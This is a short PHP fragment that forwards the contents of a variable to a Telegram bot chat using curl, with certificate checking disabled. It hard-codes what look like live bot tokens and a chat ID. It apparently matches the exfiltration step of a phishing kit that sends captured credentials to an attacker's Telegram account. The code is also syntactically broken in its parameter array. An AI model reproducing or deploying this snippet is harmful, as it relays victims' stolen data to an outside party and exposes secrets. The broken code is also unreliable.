<?php 
  $website="https://api.telegram.org/bot5812749607:AAHL_oCLneYujFaOpgp3EumxtvEOnerCUio";
  $botToken="8054681380:AAGq5oUs8XRxM6NhZA-N9F0D9hjwbfqECLU";
  $params=[
      'chat_id'=>8179736651";
      'text'=>$yagmai,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  
